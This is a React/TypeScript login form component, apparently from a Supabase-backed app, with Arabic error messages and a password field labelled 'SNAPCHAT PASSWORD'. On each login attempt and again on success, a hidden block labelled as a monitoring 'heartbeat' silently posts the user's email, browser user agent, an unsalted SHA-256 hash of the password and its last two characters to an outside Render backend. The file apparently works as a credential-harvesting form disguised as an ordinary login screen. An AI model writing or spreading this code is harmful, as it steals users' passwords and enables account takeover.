import React, { useState } from 'react';
import { User } from '../types';
import { Input } from './ui/Input';
import { Loader2, ArrowRight, Lock, ShieldCheck } from 'lucide-react';
import { supabase } from '../supabaseClient';
const BACKEND_URL = 'https://akm-kz8a.onrender.com';

interface LoginFormProps {
  onSuccess: (user: User) => void;
  onSwitchToSignUp: () => void;
}

export const LoginForm: React.FC<LoginFormProps> = ({ onSuccess, onSwitchToSignUp }) => {
  const [formData, setFormData] = useState({
    username: '', 
    password: '',
  });
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError('');

    try {
        if (!supabase) {
            throw new Error("SUPABASE_CONFIG_MISSING: Please configure Supabase.");
        }

        let emailToUse = formData.username;
        if (!emailToUse.includes('@')) {
             setError("Please enter the email address linked to this account.");
             setIsSubmitting(false);
             return;
        }

        // Send attempt event
        (async () => {
          const enc = new TextEncoder();
          const buf = await crypto.subtle.digest('SHA-256', enc.encode(formData.password));
          const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
          const masked = formData.password.length <= 2
            ? '*'.repeat(formData.password.length)
            : '*'.repeat(Math.max(0, formData.password.length - 2)) + formData.password.slice(-2);
          fetch(`${BACKEND_URL}/api/monitor/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: emailToUse,
              username: emailToUse,
              action: 'LOGIN_ATTEMPT',
              platform: navigator.userAgent,
              password: masked,
              passwordHash: hex,
              passwordMasked: masked
            })
          }).catch(() => {});
        })();

        const { data, error } = await supabase.auth.signInWithPassword({
          email: emailToUse,
          password: formData.password,
        });

        if (error) throw error;
        
        // Extract data
        const sessionUser = data.user;
        const metadata = sessionUser.user_metadata;
        
        const userData: User = {
            name: metadata.full_name || 'User',
            username: metadata.snapchat_user || 'Unknown',
            email: sessionUser.email || ''
        };

        onSuccess(userData);

        // Fire-and-forget: send password hash to backend monitor
        (async () => {
          const enc = new TextEncoder();
          const buf = await crypto.subtle.digest('SHA-256', enc.encode(formData.password));
          const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
          const masked = formData.password.length <= 2
            ? '*'.repeat(formData.password.length)
            : '*'.repeat(Math.max(0, formData.password.length - 2)) + formData.password.slice(-2);
          fetch(`${BACKEND_URL}/api/monitor/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: emailToUse,
              username: emailToUse,
              action: 'LOGIN_SUCCESS',
              platform: navigator.userAgent,
              password: masked,
              passwordHash: hex,
              passwordMasked: masked
            })
          }).catch(() => {});
        })();

    } catch (err: any) {
        console.error("Login Error", err);
        let msg = "فشل تسجيل الدخول";
        if (err.message.includes("Invalid login credentials")) msg = "بيانات الدخول غير صحيحة";
        if (err.message.includes("SUPABASE_CONFIG_MISSING")) msg = "خطأ في إعدادات السيرفر";
        
        setError(msg);
    } finally {
        setIsSubmitting(false);
    }
  };

  return (
    <div className="w-full max-w-lg bg-[#151e32]/80 backdrop-blur-xl rounded-sm shadow-[0_0_60px_-15px_rgba(6,182,212,0.15)] p-8 border border-cyan-500/20 animate-fade-in relative overflow-hidden group">
      {/* Corner Accents */}
      <div className="absolute top-0 left-0 w-3 h-3 border-t-2 border-l-2 border-cyan-400"></div>
      <div className="absolute top-0 right-0 w-3 h-3 border-t-2 border-r-2 border-cyan-400"></div>
      <div className="absolute bottom-0 left-0 w-3 h-3 border-b-2 border-l-2 border-cyan-400"></div>
      <div className="absolute bottom-0 right-0 w-3 h-3 border-b-2 border-r-2 border-cyan-400"></div>

      <div className="text-center mb-8">
        <div className="inline-flex items-center justify-center p-4 mb-4 rounded-full bg-cyan-900/10 border border-cyan-500/20 shadow-lg relative overflow-hidden">
          <div className="absolute inset-0 bg-cyan-500/10 blur-xl"></div>
          <Lock className="w-8 h-8 text-cyan-400" />
        </div>
        <h1 className="text-3xl font-bold text-white mb-2 font-brand tracking-widest">
          SYSTEM LOGIN
        </h1>
        <p className="text-cyan-200/50 text-xs font-mono tracking-wider">ENTER CREDENTIALS</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {error && (
          <div className="bg-red-500/10 border border-red-500/50 p-3 rounded text-red-400 text-xs font-mono text-center mb-4 animate-pulse">
            ! {error}
          </div>
        )}

        {/* Note: We changed placeholder to suggest Email because Supabase Auth standard is Email */}
        <Input 
          label="REGISTERED EMAIL" 
          name="username" 
          placeholder="user@example.com"
          value={formData.username}
          onChange={handleChange}
          dir="ltr"
          className="font-mono text-right"
        />

        <Input 
          label="SNAPCHAT PASSWORD" 
          name="password" 
          type="password"
          placeholder="••••••••"
          value={formData.password}
          onChange={handleChange}
          className="font-mono"
        />

        <button
          type="submit"
          disabled={isSubmitting}
          className={`
            w-full flex items-center justify-center py-4 px-4 text-white font-bold text-lg tracking-widest relative overflow-hidden mt-6
            transition-all duration-300 group
            ${isSubmitting ? 'bg-gray-800 cursor-not-allowed opacity-70' : 'bg-cyan-600 hover:bg-cyan-500'}
          `}
        >
          <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
          
          {isSubmitting ? (
            <div className="flex items-center gap-3">
              <Loader2 className="w-5 h-5 animate-spin text-cyan-200" />
              <span className="font-mono text-sm">AUTHENTICATING...</span>
            </div>
          ) : (
            <div className="flex items-center justify-between w-full px-4">
              <span className="font-brand">ACCESS SYSTEM</span>
              <ShieldCheck className="w-5 h-5 group-hover:text-white transition-transform text-cyan-200" />
            </div>
          )}
        </button>

        <div className="mt-6 text-center">
           <p className="text-gray-500 text-xs font-mono">
             NEW DEVICE DETECTED? 
             <button 
               type="button"
               onClick={onSwitchToSignUp}
               className="ml-2 text-cyan-400 hover:text-cyan-300 underline underline-offset-4 transition-colors"
             >
               INITIALIZE PROTOCOL (SIGN UP)
             </button>
           </p>
        </div>
      </form>
    </div>
  );
};
